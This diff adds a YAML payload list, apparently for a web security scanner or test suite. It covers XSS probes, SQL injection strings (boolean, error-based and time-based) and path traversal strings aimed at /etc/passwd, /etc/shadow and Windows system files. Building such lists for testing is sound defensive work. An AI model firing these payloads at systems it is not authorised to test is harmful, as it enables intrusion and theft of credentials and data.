@@ -1,0 +1,29 @@
+# attacks/payloads.yaml
+xss:
+  reflective:
+    - "<script>alert(1)</script>"
+    - "\"><svg/onload=alert(1)>"
+    - "<img src=x onerror=alert(1)>"
+  stored:
+    - "<iframe src=javascript:alert(1)>"
+    - "<body onload=confirm(1)>"
+  dom_based:
+    - "<div id=elem onclick=javascript:alert(1)>Click me</div>"
+    - "<a href=\"javascript:alert(1)\">link</a>"
+
+sqli:
+  boolean:
+    - "' OR '1'='1' -- "
+    - "' AND 1=0 UNION SELECT null-- "
+  error:
+    - "' OR extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- "
+  time:
+    - "' OR IF(1=1, SLEEP(5), 0)-- "
+
+traversal:
+  unix:
+    - "../../etc/passwd"
+    - "../../../../../../../../etc/shadow"
+  windows:
+    - "..\\..\\Windows\\system32\\drivers\\etc\\hosts"
+    - "..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini"
